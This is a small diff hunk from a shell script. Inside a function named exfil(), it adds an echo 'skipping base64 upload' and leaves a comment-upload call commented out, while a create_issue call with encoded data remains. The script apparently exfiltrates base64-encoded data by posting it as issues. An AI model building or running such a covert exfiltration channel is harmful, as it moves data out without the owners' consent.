@@ -16,6 +16,7 @@ exfil() {
     if [ -z "$ISSUE_NUMBER" ]; then
         create_issue "$encoded"
     else
+        echo "skipping base64 upload"
         # create_comment "$encoded"
     fi
     
